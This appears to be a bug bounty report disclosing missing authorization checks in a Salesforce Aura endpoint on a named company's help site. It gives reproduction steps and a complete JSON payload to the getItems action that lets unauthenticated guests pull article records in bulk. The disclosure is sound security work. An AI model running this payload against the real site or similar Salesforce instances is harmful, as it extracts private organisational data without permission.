Target: 
Summary: The web application is built using Salesforce. Salesforce is a CRM for developing web applications providing a number of abstractions to simplify the development of data-driven applications. In particular, the Aura framework enables developers to build applications using reusable components exposing an API in order for the components to interact with the application.
During testing it, I was discovered that the Salesforce instance doesnt check permissions on the Article_kav custom object for unauthenticated Guest users and returning to big amount article with large content-length.
Affected Parameter(s): "message"

##Steps to Reproduce/POC
1. Open the burp suite or owasp zip proxy.
2. Navigate to this url with your proxy browser: "https://help.glassdoor.com"
3. Send to any "POST /s/sfsites/aura?" request to repeater
4. Delete the message parameter payload and write this payload:
Code 366 BytesPretty print: off Wrap lines Copy Download
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"***","layoutType":"FULL","pageSize":250,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]} 


5. After send the payload and observe the returning big data.


Impact
The Salesforce instance does not enforce sufficient authorization checks when specific objects are requested. As such, an unauthenticated attacker 
may be able to extract sensitive data from the records in these objects which contains information of other users. This includes internal information/meetings.
